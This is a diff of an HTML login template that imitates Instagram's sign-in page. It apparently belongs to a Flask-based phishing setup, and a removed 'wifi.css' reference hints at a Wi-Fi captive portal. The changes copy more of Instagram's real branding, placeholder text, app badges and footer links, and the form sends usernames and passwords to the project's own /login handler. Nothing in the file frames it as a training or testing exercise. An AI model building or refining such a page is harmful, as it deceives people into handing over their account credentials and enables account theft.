@@ -1,31 +1,61 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <style>
-        body { font-family: Arial, sans-serif; background: #fafafa; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-box { background: #fff; border: 1px solid #dbdbdb; border-radius: 3px; padding: 20px 40px; width: 350px; text-align: center; }
-        .logo { font-family: 'Billabong', cursive; font-size: 48px; margin: 20px 0; color: #262626; }
-        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
-        button { background: #0095f6; color: white; border: none; padding: 8px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; }
-        button:hover { background: #0080e5; }
-        .footer { margin-top: 20px; color: #8e8e8e; font-size: 12px; }
-    </style>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/instagram.css') }}">
 </head>
 <body>
-    <div class="login-box">
-        <div class="logo">Instagram</div>
-        <form action="/login" method="POST">
-            <input type="text" name="username" placeholder="Username" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Log In</button>
-        </form>
-        <div class="footer">© 2025 Instagram, Meta</div>
+    <div class="wrapper">
+        <div class="login-box">
+            <div class="logo">Instagram</div>
+            <form action="/login" method="POST">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit" class="login-button">Log In</button>
+                <div class="divider">
+                    <span>OR</span>
+                </div>
+                <div class="facebook-login">
+                    <a href="#"><i class="fb-icon"></i> Log in with Facebook</a>
+                </div>
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+            </form>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+        <div class="apps">
+            <p>Get the app.</p>
+            <div class="app-buttons">
+                <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store"></a>
+                <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play"></a>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Top Accounts</a>
+            <a href="#">Hashtags</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+        </div>
+        <div class="copyright">
+            <span>© 2023 Instagram from Meta</span>
+        </div>
     </div>
 </body>
 </html>
-<head>
-    <title>instagram Login</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='instagram/wifi.css') }}">
-</head>
 
